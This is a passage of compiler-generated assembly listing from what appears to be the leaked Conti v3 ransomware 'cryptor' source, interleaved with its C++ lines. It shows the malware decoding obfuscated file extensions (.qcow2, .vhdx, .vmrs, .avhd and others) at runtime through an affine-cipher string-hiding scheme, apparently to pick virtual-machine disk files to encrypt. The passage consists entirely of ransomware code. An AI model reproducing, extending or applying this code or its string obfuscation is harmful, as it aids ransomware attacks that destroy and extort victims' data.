; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00747	46 88 44 0d 41	 mov	 BYTE PTR $T11[rbp+r9-255], r8b
  0074c	49 ff c1	 inc	 r9
  0074f	49 83 f9 0e	 cmp	 r9, 14
  00753	72 ab		 jb	 SHORT $LL395@CheckForVi
$LN394@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 499  : 		OBFW(L".qcow2"),

  00755	48 8d 45 41	 lea	 rax, QWORD PTR $T11[rbp-255]
  00759	48 89 85 c0 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-176], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00760	88 5d 50	 mov	 BYTE PTR $T12[rbp-256], bl
  00763	c6 45 51 6d	 mov	 BYTE PTR $T12[rbp-255], 109 ; 0000006dH
  00767	c6 45 52 6f	 mov	 BYTE PTR $T12[rbp-254], 111 ; 0000006fH
  0076b	c6 45 53 6a	 mov	 BYTE PTR $T12[rbp-253], 106 ; 0000006aH
  0076f	c6 45 54 6f	 mov	 BYTE PTR $T12[rbp-252], 111 ; 0000006fH
  00773	c6 45 55 01	 mov	 BYTE PTR $T12[rbp-251], 1
  00777	c6 45 56 6f	 mov	 BYTE PTR $T12[rbp-250], 111 ; 0000006fH
  0077b	c6 45 57 2e	 mov	 BYTE PTR $T12[rbp-249], 46 ; 0000002eH
  0077f	c6 45 58 6f	 mov	 BYTE PTR $T12[rbp-248], 111 ; 0000006fH
  00783	c6 45 59 0c	 mov	 BYTE PTR $T12[rbp-247], 12
  00787	c6 45 5a 6f	 mov	 BYTE PTR $T12[rbp-246], 111 ; 0000006fH
  0078b	c6 45 5b 3e	 mov	 BYTE PTR $T12[rbp-245], 62 ; 0000003eH
  0078f	c6 45 5c 6f	 mov	 BYTE PTR $T12[rbp-244], 111 ; 0000006fH
  00793	c6 45 5d 1d	 mov	 BYTE PTR $T12[rbp-243], 29
  00797	c6 45 5e 6f	 mov	 BYTE PTR $T12[rbp-242], 111 ; 0000006fH
  0079b	c6 45 5f 6f	 mov	 BYTE PTR $T12[rbp-241], 111 ; 0000006fH
  0079f	c6 45 60 6f	 mov	 BYTE PTR $T12[rbp-240], 111 ; 0000006fH
  007a3	0f b6 45 51	 movzx	 eax, BYTE PTR $T12[rbp-255]

; 58   :         return m_isDecrypted;

  007a7	0f b6 45 50	 movzx	 eax, BYTE PTR $T12[rbp-256]

; 63   :         if (!isDecrypted())

  007ab	84 c0		 test	 al, al
  007ad	75 62		 jne	 SHORT $LN440@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  007af	4c 8b c3	 mov	 r8, rbx
  007b2	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL441@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  007c0	42 0f b6 4c 05
	51		 movzx	 ecx, BYTE PTR $T12[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  007c6	b8 6f 00 00 00	 mov	 eax, 111		; 0000006fH
  007cb	2b c1		 sub	 eax, ecx
  007cd	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  007d0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  007d5	f7 e9		 imul	 ecx
  007d7	03 d1		 add	 edx, ecx
  007d9	c1 fa 06	 sar	 edx, 6
  007dc	8b c2		 mov	 eax, edx
  007de	c1 e8 1f	 shr	 eax, 31
  007e1	03 d0		 add	 edx, eax
  007e3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  007e6	2b c8		 sub	 ecx, eax
  007e8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  007ed	83 c1 7f	 add	 ecx, 127		; 0000007fH
  007f0	f7 e9		 imul	 ecx
  007f2	03 d1		 add	 edx, ecx
  007f4	c1 fa 06	 sar	 edx, 6
  007f7	8b c2		 mov	 eax, edx
  007f9	c1 e8 1f	 shr	 eax, 31
  007fc	03 d0		 add	 edx, eax
  007fe	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00801	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00803	42 88 4c 05 51	 mov	 BYTE PTR $T12[rbp+r8-255], cl
  00808	49 ff c0	 inc	 r8
  0080b	49 83 f8 10	 cmp	 r8, 16
  0080f	72 af		 jb	 SHORT $LL441@CheckForVi
$LN440@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 500  : 		OBFW(L".subvol"),

  00811	48 8d 45 51	 lea	 rax, QWORD PTR $T12[rbp-255]
  00815	48 89 85 c8 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-168], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0081c	88 5c 24 70	 mov	 BYTE PTR $T13[rsp], bl
  00820	c6 44 24 71 5a	 mov	 BYTE PTR $T13[rsp+1], 90 ; 0000005aH
  00825	c6 44 24 72 16	 mov	 BYTE PTR $T13[rsp+2], 22
  0082a	c6 44 24 73 49	 mov	 BYTE PTR $T13[rsp+3], 73 ; 00000049H
  0082f	c6 44 24 74 16	 mov	 BYTE PTR $T13[rsp+4], 22
  00834	c6 44 24 75 7a	 mov	 BYTE PTR $T13[rsp+5], 122 ; 0000007aH
  00839	c6 44 24 76 16	 mov	 BYTE PTR $T13[rsp+6], 22
  0083e	c6 44 24 77 1e	 mov	 BYTE PTR $T13[rsp+7], 30
  00843	c6 44 24 78 16	 mov	 BYTE PTR $T13[rsp+8], 22
  00848	c6 44 24 79 16	 mov	 BYTE PTR $T13[rsp+9], 22
  0084d	c6 44 24 7a 16	 mov	 BYTE PTR $T13[rsp+10], 22
  00852	0f b6 44 24 71	 movzx	 eax, BYTE PTR $T13[rsp+1]

; 58   :         return m_isDecrypted;

  00857	0f b6 44 24 70	 movzx	 eax, BYTE PTR $T13[rsp]

; 63   :         if (!isDecrypted())

  0085c	84 c0		 test	 al, al
  0085e	75 63		 jne	 SHORT $LN474@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00860	4c 8b c3	 mov	 r8, rbx
  00863	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL475@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00870	42 0f b6 4c 04
	71		 movzx	 ecx, BYTE PTR $T13[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00876	b8 16 00 00 00	 mov	 eax, 22
  0087b	2b c1		 sub	 eax, ecx
  0087d	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00880	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00885	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00887	f7 e9		 imul	 ecx
  00889	03 d1		 add	 edx, ecx
  0088b	c1 fa 06	 sar	 edx, 6
  0088e	8b c2		 mov	 eax, edx
  00890	c1 e8 1f	 shr	 eax, 31
  00893	03 d0		 add	 edx, eax
  00895	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00898	2b c8		 sub	 ecx, eax
  0089a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0089f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  008a2	f7 e9		 imul	 ecx
  008a4	03 d1		 add	 edx, ecx
  008a6	c1 fa 06	 sar	 edx, 6
  008a9	8b c2		 mov	 eax, edx
  008ab	c1 e8 1f	 shr	 eax, 31
  008ae	03 d0		 add	 edx, eax
  008b0	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  008b3	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  008b5	42 88 4c 04 71	 mov	 BYTE PTR $T13[rsp+r8+1], cl
  008ba	49 ff c0	 inc	 r8
  008bd	49 83 f8 0a	 cmp	 r8, 10
  008c1	72 ad		 jb	 SHORT $LL475@CheckForVi
$LN474@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 501  : 		OBFW(L".bin"),

  008c3	48 8d 44 24 71	 lea	 rax, QWORD PTR $T13[rsp+1]
  008c8	48 89 85 d0 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-160], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  008cf	88 5d 80	 mov	 BYTE PTR $T14[rbp-256], bl
  008d2	c6 45 81 5f	 mov	 BYTE PTR $T14[rbp-255], 95 ; 0000005fH
  008d6	c6 45 82 03	 mov	 BYTE PTR $T14[rbp-254], 3
  008da	c6 45 83 70	 mov	 BYTE PTR $T14[rbp-253], 112 ; 00000070H
  008de	c6 45 84 03	 mov	 BYTE PTR $T14[rbp-252], 3
  008e2	c6 45 85 6a	 mov	 BYTE PTR $T14[rbp-251], 106 ; 0000006aH
  008e6	c6 45 86 03	 mov	 BYTE PTR $T14[rbp-250], 3
  008ea	c6 45 87 70	 mov	 BYTE PTR $T14[rbp-249], 112 ; 00000070H
  008ee	c6 45 88 03	 mov	 BYTE PTR $T14[rbp-248], 3
  008f2	c6 45 89 03	 mov	 BYTE PTR $T14[rbp-247], 3
  008f6	c6 45 8a 03	 mov	 BYTE PTR $T14[rbp-246], 3
  008fa	0f b6 45 81	 movzx	 eax, BYTE PTR $T14[rbp-255]

; 58   :         return m_isDecrypted;

  008fe	0f b6 45 80	 movzx	 eax, BYTE PTR $T14[rbp-256]

; 63   :         if (!isDecrypted())

  00902	84 c0		 test	 al, al
  00904	75 5b		 jne	 SHORT $LN508@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00906	4c 8b c3	 mov	 r8, rbx
  00909	0f 1f 80 00 00
	00 00		 npad	 7
$LL509@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00910	42 0f b6 4c 05
	81		 movzx	 ecx, BYTE PTR $T14[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00916	b8 03 00 00 00	 mov	 eax, 3
  0091b	2b c1		 sub	 eax, ecx
  0091d	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00920	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00925	f7 e9		 imul	 ecx
  00927	03 d1		 add	 edx, ecx
  00929	c1 fa 06	 sar	 edx, 6
  0092c	8b c2		 mov	 eax, edx
  0092e	c1 e8 1f	 shr	 eax, 31
  00931	03 d0		 add	 edx, eax
  00933	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00936	2b c8		 sub	 ecx, eax
  00938	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0093d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00940	f7 e9		 imul	 ecx
  00942	03 d1		 add	 edx, ecx
  00944	c1 fa 06	 sar	 edx, 6
  00947	8b c2		 mov	 eax, edx
  00949	c1 e8 1f	 shr	 eax, 31
  0094c	03 d0		 add	 edx, eax
  0094e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00951	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00953	42 88 4c 05 81	 mov	 BYTE PTR $T14[rbp+r8-255], cl
  00958	49 ff c0	 inc	 r8
  0095b	49 83 f8 0a	 cmp	 r8, 10
  0095f	72 af		 jb	 SHORT $LL509@CheckForVi
$LN508@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 502  : 		OBFW(L".vsv"),

  00961	48 8d 45 81	 lea	 rax, QWORD PTR $T14[rbp-255]
  00965	48 89 85 d8 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-152], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0096c	88 5d e0	 mov	 BYTE PTR $T15[rbp-256], bl
  0096f	c6 45 e1 3c	 mov	 BYTE PTR $T15[rbp-255], 60 ; 0000003cH
  00973	c6 45 e2 60	 mov	 BYTE PTR $T15[rbp-254], 96 ; 00000060H
  00977	c6 45 e3 7d	 mov	 BYTE PTR $T15[rbp-253], 125 ; 0000007dH
  0097b	c6 45 e4 60	 mov	 BYTE PTR $T15[rbp-252], 96 ; 00000060H
  0097f	c6 45 e5 5c	 mov	 BYTE PTR $T15[rbp-251], 92 ; 0000005cH
  00983	c6 45 e6 60	 mov	 BYTE PTR $T15[rbp-250], 96 ; 00000060H
  00987	c6 45 e7 72	 mov	 BYTE PTR $T15[rbp-249], 114 ; 00000072H
  0098b	c6 45 e8 60	 mov	 BYTE PTR $T15[rbp-248], 96 ; 00000060H
  0098f	c6 45 e9 54	 mov	 BYTE PTR $T15[rbp-247], 84 ; 00000054H
  00993	c6 45 ea 60	 mov	 BYTE PTR $T15[rbp-246], 96 ; 00000060H
  00997	c6 45 eb 60	 mov	 BYTE PTR $T15[rbp-245], 96 ; 00000060H
  0099b	c6 45 ec 60	 mov	 BYTE PTR $T15[rbp-244], 96 ; 00000060H
  0099f	0f b6 45 e1	 movzx	 eax, BYTE PTR $T15[rbp-255]

; 58   :         return m_isDecrypted;

  009a3	0f b6 45 e0	 movzx	 eax, BYTE PTR $T15[rbp-256]

; 63   :         if (!isDecrypted())

  009a7	84 c0		 test	 al, al
  009a9	75 5a		 jne	 SHORT $LN546@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  009ab	4c 8b cb	 mov	 r9, rbx
  009ae	66 90		 npad	 2
$LL547@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  009b0	42 0f b6 4c 0d
	e1		 movzx	 ecx, BYTE PTR $T15[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  009b6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  009bb	83 e9 60	 sub	 ecx, 96			; 00000060H
  009be	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  009c2	41 f7 e8	 imul	 r8d
  009c5	41 03 d0	 add	 edx, r8d
  009c8	c1 fa 06	 sar	 edx, 6
  009cb	8b c2		 mov	 eax, edx
  009cd	c1 e8 1f	 shr	 eax, 31
  009d0	03 d0		 add	 edx, eax
  009d2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  009d5	44 2b c0	 sub	 r8d, eax
  009d8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  009dd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  009e1	41 f7 e8	 imul	 r8d
  009e4	41 03 d0	 add	 edx, r8d
  009e7	c1 fa 06	 sar	 edx, 6
  009ea	8b c2		 mov	 eax, edx
  009ec	c1 e8 1f	 shr	 eax, 31
  009ef	03 d0		 add	 edx, eax
  009f1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  009f4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  009f7	46 88 44 0d e1	 mov	 BYTE PTR $T15[rbp+r9-255], r8b
  009fc	49 ff c1	 inc	 r9
  009ff	49 83 f9 0c	 cmp	 r9, 12
  00a03	72 ab		 jb	 SHORT $LL547@CheckForVi
$LN546@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 503  : 		OBFW(L".avhd"),

  00a05	48 8d 45 e1	 lea	 rax, QWORD PTR $T15[rbp-255]
  00a09	48 89 85 e0 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-144], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00a10	88 5d f0	 mov	 BYTE PTR $T16[rbp-256], bl
  00a13	c6 45 f1 6f	 mov	 BYTE PTR $T16[rbp-255], 111 ; 0000006fH
  00a17	c6 45 f2 5b	 mov	 BYTE PTR $T16[rbp-254], 91 ; 0000005bH
  00a1b	c6 45 f3 41	 mov	 BYTE PTR $T16[rbp-253], 65 ; 00000041H
  00a1f	c6 45 f4 5b	 mov	 BYTE PTR $T16[rbp-252], 91 ; 0000005bH
  00a23	c6 45 f5 27	 mov	 BYTE PTR $T16[rbp-251], 39 ; 00000027H
  00a27	c6 45 f6 5b	 mov	 BYTE PTR $T16[rbp-250], 91 ; 0000005bH
  00a2b	c6 45 f7 7c	 mov	 BYTE PTR $T16[rbp-249], 124 ; 0000007cH
  00a2f	c6 45 f8 5b	 mov	 BYTE PTR $T16[rbp-248], 91 ; 0000005bH
  00a33	c6 45 f9 0e	 mov	 BYTE PTR $T16[rbp-247], 14
  00a37	c6 45 fa 5b	 mov	 BYTE PTR $T16[rbp-246], 91 ; 0000005bH
  00a3b	c6 45 fb 5b	 mov	 BYTE PTR $T16[rbp-245], 91 ; 0000005bH
  00a3f	c6 45 fc 5b	 mov	 BYTE PTR $T16[rbp-244], 91 ; 0000005bH
  00a43	0f b6 45 f1	 movzx	 eax, BYTE PTR $T16[rbp-255]

; 58   :         return m_isDecrypted;

  00a47	0f b6 45 f0	 movzx	 eax, BYTE PTR $T16[rbp-256]

; 63   :         if (!isDecrypted())

  00a4b	84 c0		 test	 al, al
  00a4d	75 58		 jne	 SHORT $LN682@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00a4f	4c 8b cb	 mov	 r9, rbx
$LL683@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00a52	42 0f b6 4c 0d
	f1		 movzx	 ecx, BYTE PTR $T16[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00a58	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00a5d	83 e9 5b	 sub	 ecx, 91			; 0000005bH
  00a60	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00a64	41 f7 e8	 imul	 r8d
  00a67	41 03 d0	 add	 edx, r8d
  00a6a	c1 fa 06	 sar	 edx, 6
  00a6d	8b c2		 mov	 eax, edx
  00a6f	c1 e8 1f	 shr	 eax, 31
  00a72	03 d0		 add	 edx, eax
  00a74	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00a77	44 2b c0	 sub	 r8d, eax
  00a7a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00a7f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00a83	41 f7 e8	 imul	 r8d
  00a86	41 03 d0	 add	 edx, r8d
  00a89	c1 fa 06	 sar	 edx, 6
  00a8c	8b c2		 mov	 eax, edx
  00a8e	c1 e8 1f	 shr	 eax, 31
  00a91	03 d0		 add	 edx, eax
  00a93	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00a96	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00a99	46 88 44 0d f1	 mov	 BYTE PTR $T16[rbp+r9-255], r8b
  00a9e	49 ff c1	 inc	 r9
  00aa1	49 83 f9 0c	 cmp	 r9, 12
  00aa5	72 ab		 jb	 SHORT $LL683@CheckForVi
$LN682@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 504  : 		OBFW(L".vmrs"),

  00aa7	48 8d 45 f1	 lea	 rax, QWORD PTR $T16[rbp-255]
  00aab	48 89 85 e8 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-136], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00ab2	88 5d 00	 mov	 BYTE PTR $T17[rbp-256], bl
  00ab5	c6 45 01 37	 mov	 BYTE PTR $T17[rbp-255], 55 ; 00000037H
  00ab9	c6 45 02 1e	 mov	 BYTE PTR $T17[rbp-254], 30
  00abd	c6 45 03 3d	 mov	 BYTE PTR $T17[rbp-253], 61 ; 0000003dH
  00ac1	c6 45 04 1e	 mov	 BYTE PTR $T17[rbp-252], 30
  00ac5	c6 45 05 51	 mov	 BYTE PTR $T17[rbp-251], 81 ; 00000051H
  00ac9	c6 45 06 1e	 mov	 BYTE PTR $T17[rbp-250], 30
  00acd	c6 45 07 7b	 mov	 BYTE PTR $T17[rbp-249], 123 ; 0000007bH
  00ad1	c6 45 08 1e	 mov	 BYTE PTR $T17[rbp-248], 30
  00ad5	c6 45 09 28	 mov	 BYTE PTR $T17[rbp-247], 40 ; 00000028H
  00ad9	c6 45 0a 1e	 mov	 BYTE PTR $T17[rbp-246], 30
  00add	c6 45 0b 1e	 mov	 BYTE PTR $T17[rbp-245], 30
  00ae1	c6 45 0c 1e	 mov	 BYTE PTR $T17[rbp-244], 30
  00ae5	0f b6 45 01	 movzx	 eax, BYTE PTR $T17[rbp-255]

; 58   :         return m_isDecrypted;

  00ae9	0f b6 45 00	 movzx	 eax, BYTE PTR $T17[rbp-256]

; 63   :         if (!isDecrypted())

  00aed	84 c0		 test	 al, al
  00aef	75 68		 jne	 SHORT $LN632@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00af1	4c 8b cb	 mov	 r9, rbx
  00af4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL633@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00b00	42 0f b6 4c 0d
	01		 movzx	 ecx, BYTE PTR $T17[rbp+r9-255]

; 40   :     return (a % n + n) % n;

  00b06	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00b0b	83 e9 1e	 sub	 ecx, 30
  00b0e	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00b12	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00b16	41 f7 e8	 imul	 r8d
  00b19	41 03 d0	 add	 edx, r8d
  00b1c	c1 fa 06	 sar	 edx, 6
  00b1f	8b c2		 mov	 eax, edx
  00b21	c1 e8 1f	 shr	 eax, 31
  00b24	03 d0		 add	 edx, eax
  00b26	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00b29	44 2b c0	 sub	 r8d, eax
  00b2c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00b31	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00b35	41 f7 e8	 imul	 r8d
  00b38	41 03 d0	 add	 edx, r8d
  00b3b	c1 fa 06	 sar	 edx, 6
  00b3e	8b c2		 mov	 eax, edx
  00b40	c1 e8 1f	 shr	 eax, 31
  00b43	03 d0		 add	 edx, eax
  00b45	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00b48	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00b4b	46 88 44 0d 01	 mov	 BYTE PTR $T17[rbp+r9-255], r8b
  00b50	49 ff c1	 inc	 r9
  00b53	49 83 f9 0c	 cmp	 r9, 12
  00b57	72 a7		 jb	 SHORT $LL633@CheckForVi
$LN632@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 505  : 		OBFW(L".vhdx"),

  00b59	48 8d 45 01	 lea	 rax, QWORD PTR $T17[rbp-255]
  00b5d	48 89 85 f0 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-128], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00b64	88 5d 10	 mov	 BYTE PTR $T18[rbp-256], bl
  00b67	c6 45 11 59	 mov	 BYTE PTR $T18[rbp-255], 89 ; 00000059H
  00b6b	c6 45 12 51	 mov	 BYTE PTR $T18[rbp-254], 81 ; 00000051H
  00b6f	c6 45 13 04	 mov	 BYTE PTR $T18[rbp-253], 4
  00b73	c6 45 14 51	 mov	 BYTE PTR $T18[rbp-252], 81 ; 00000051H
  00b77	c6 45 15 60	 mov	 BYTE PTR $T18[rbp-251], 96 ; 00000060H
  00b7b	c6 45 16 51	 mov	 BYTE PTR $T18[rbp-250], 81 ; 00000051H
  00b7f	c6 45 17 7e	 mov	 BYTE PTR $T18[rbp-249], 126 ; 0000007eH
  00b83	c6 45 18 51	 mov	 BYTE PTR $T18[rbp-248], 81 ; 00000051H
  00b87	c6 45 19 08	 mov	 BYTE PTR $T18[rbp-247], 8
  00b8b	c6 45 1a 51	 mov	 BYTE PTR $T18[rbp-246], 81 ; 00000051H
  00b8f	c6 45 1b 51	 mov	 BYTE PTR $T18[rbp-245], 81 ; 00000051H
  00b93	c6 45 1c 51	 mov	 BYTE PTR $T18[rbp-244], 81 ; 00000051H
  00b97	0f b6 45 11	 movzx	 eax, BYTE PTR $T18[rbp-255]

; 58   :         return m_isDecrypted;

  00b9b	0f b6 45 10	 movzx	 eax, BYTE PTR $T18[rbp-256]

; 63   :         if (!isDecrypted())

  00b9f	84 c0		 test	 al, al
  00ba1	75 5e		 jne	 SHORT $LN670@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00ba3	4c 8b c3	 mov	 r8, rbx
  00ba6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL671@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00bb0	42 0f b6 4c 05
	11		 movzx	 ecx, BYTE PTR $T18[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00bb6	b8 51 00 00 00	 mov	 eax, 81			; 00000051H
  00bbb	2b c1		 sub	 eax, ecx
  00bbd	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00bc0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00bc5	f7 e9		 imul	 ecx
  00bc7	03 d1		 add	 edx, ecx
  00bc9	c1 fa 06	 sar	 edx, 6
  00bcc	8b c2		 mov	 eax, edx
  00bce	c1 e8 1f	 shr	 eax, 31
  00bd1	03 d0		 add	 edx, eax
  00bd3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00bd6	2b c8		 sub	 ecx, eax
  00bd8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00bdd	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00be0	f7 e9		 imul	 ecx
  00be2	03 d1		 add	 edx, ecx
  00be4	c1 fa 06	 sar	 edx, 6
  00be7	8b c2		 mov	 eax, edx
  00be9	c1 e8 1f	 shr	 eax, 31
  00bec	03 d0		 add	 edx, eax
  00bee	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00bf1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00bf3	42 88 4c 05 11	 mov	 BYTE PTR $T18[rbp+r8-255], cl
  00bf8	49 ff c0	 inc	 r8
  00bfb	49 83 f8 0c	 cmp	 r8, 12
  00bff	72 af		 jb	 SHORT $LL671@CheckForVi
$LN670@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 506  : 		OBFW(L".avdx"),

  00c01	48 8d 45 11	 lea	 rax, QWORD PTR $T18[rbp-255]
  00c05	48 89 85 f8 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-120], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00c0c	88 5d 20	 mov	 BYTE PTR $T19[rbp-256], bl
  00c0f	c6 45 21 70	 mov	 BYTE PTR $T19[rbp-255], 112 ; 00000070H
  00c13	c6 45 22 22	 mov	 BYTE PTR $T19[rbp-254], 34 ; 00000022H
  00c17	c6 45 23 55	 mov	 BYTE PTR $T19[rbp-253], 85 ; 00000055H
  00c1b	c6 45 24 22	 mov	 BYTE PTR $T19[rbp-252], 34 ; 00000022H
  00c1f	c6 45 25 09	 mov	 BYTE PTR $T19[rbp-251], 9
  00c23	c6 45 26 22	 mov	 BYTE PTR $T19[rbp-250], 34 ; 00000022H
  00c27	c6 45 27 6c	 mov	 BYTE PTR $T19[rbp-249], 108 ; 0000006cH
  00c2b	c6 45 28 22	 mov	 BYTE PTR $T19[rbp-248], 34 ; 00000022H
  00c2f	c6 45 29 74	 mov	 BYTE PTR $T19[rbp-247], 116 ; 00000074H
  00c33	c6 45 2a 22	 mov	 BYTE PTR $T19[rbp-246], 34 ; 00000022H
  00c37	c6 45 2b 22	 mov	 BYTE PTR $T19[rbp-245], 34 ; 00000022H
  00c3b	c6 45 2c 22	 mov	 BYTE PTR $T19[rbp-244], 34 ; 00000022H
  00c3f	0f b6 45 21	 movzx	 eax, BYTE PTR $T19[rbp-255]

; 58   :         return m_isDecrypted;

  00c43	0f b6 45 20	 movzx	 eax, BYTE PTR $T19[rbp-256]

; 63   :         if (!isDecrypted())

